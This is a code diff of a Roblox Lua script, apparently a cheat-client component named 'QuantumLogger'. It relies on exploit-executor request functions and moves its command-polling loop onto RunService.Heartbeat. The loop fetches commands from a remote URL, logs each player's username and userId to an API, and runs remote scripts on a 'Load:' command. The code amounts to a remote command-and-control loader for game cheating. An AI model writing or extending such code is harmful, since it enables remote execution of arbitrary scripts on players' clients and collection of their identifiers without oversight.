@@ -3,6 +3,7 @@ _G.QuantumLoggerRunning = true
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local request = (syn and syn.request) or (http and http.request) or http_request or request
 
@@ -34,42 +35,47 @@ function Client:LoadRemoteScript(name)
 	end
 end
 
+-- Heartbeat-based polling loop
 task.spawn(function()
-	while true do
-		local success, response = pcall(function()
-			return request({
-				Url = commandUrl,
-				Method = "GET"
-			})
-		end)
+	local timer = 0
+	RunService.Heartbeat:Connect(function(dt)
+		timer += dt
+		if timer >= 2 then
+			timer = 0
 
-		if success and response and response.Body then
-			local data = HttpService:JSONDecode(response.Body)
-			if data and data.command then
-				local cmd = data.command
+			local success, response = pcall(function()
+				return request({
+					Url = commandUrl,
+					Method = "GET"
+				})
+			end)
 
-				-- Log command to API (optional)
-				pcall(function()
-					request({
-						Url = "http://localhost:3000/log",
-						Method = "POST",
-						Headers = {["Content-Type"] = "application/json"},
-						Body = HttpService:JSONEncode({
-							username = LocalPlayer.Name,
-							userId = LocalPlayer.UserId,
-							command = cmd
+			if success and response and response.Body then
+				local data = HttpService:JSONDecode(response.Body)
+				if data and data.command then
+					local cmd = data.command
+
+					-- Log command to API (optional)
+					pcall(function()
+						request({
+							Url = "http://localhost:3000/log",
+							Method = "POST",
+							Headers = {["Content-Type"] = "application/json"},
+							Body = HttpService:JSONEncode({
+								username = LocalPlayer.Name,
+								userId = LocalPlayer.UserId,
+								command = cmd
+							})
 						})
-					})
-				end)
+					end)
 
-				if cmd:sub(1, 5) == "Load:" then
-					Client:LoadRemoteScript(cmd:sub(6))
-				else
-					Client:SetFeature(cmd, true)
+					if cmd:sub(1, 5) == "Load:" then
+						Client:LoadRemoteScript(cmd:sub(6))
+					else
+						Client:SetFeature(cmd, true)
+					end
 				end
 			end
 		end
-
-		task.wait(5)
-	end
+	end)
 end)
